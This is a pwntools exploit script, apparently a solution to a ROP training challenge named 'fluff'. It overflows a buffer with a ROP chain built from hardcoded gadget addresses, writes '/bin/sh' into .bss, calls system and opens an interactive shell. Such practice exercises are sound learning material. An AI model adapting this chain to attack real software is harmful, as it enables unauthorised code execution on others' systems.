from pwn import *
p = process("./fluff")

i = 0
while i < 4:
    print(p.recvline())
    i = i + 1

junk = "\x41" * 40
mov_r11_r10 = p64(0x40084e) #mov qword ptr [r10], r11; pop r13; pop r12; xor byte ptr [r10], r12b; ret;
xchg = p64(0x400840) #xchg r11, r10; pop r15; mov r11d, 0x602050; ret;
empty_r11 = p64(0x400822) #xor r11, r11; pop r14; mov edi, 0x601050; ret; empty r11
mov_r12_r11 = p64(0x40082f) #xor r11, r12; pop r12; mov r13d, 0x604060; ret; move r12 to r11
set_r12 = p64(0x4008bc) #pop r12; pop r13; pop r14; pop r15; ret; enter /bin/sh value to r12
bogus = p64(0x0)
bss = p64(0x601060)
shstring = "/bin/sh\x00"
pop_rdi = p64(0x4008c3) #: pop rdi; ret;
system = p64(0x4005e0)

rop = junk + empty_r11 + bogus + set_r12 + bss + bogus + bogus + bogus + mov_r12_r11 + bogus + xchg + bogus + empty_r11 + bogus + set_r12 + shstring + bogus + bogus + bogus + mov_r12_r11 + bogus + mov_r11_r10 + bogus + bogus + pop_rdi + bss + system

p.sendline(rop)
p.interactive()
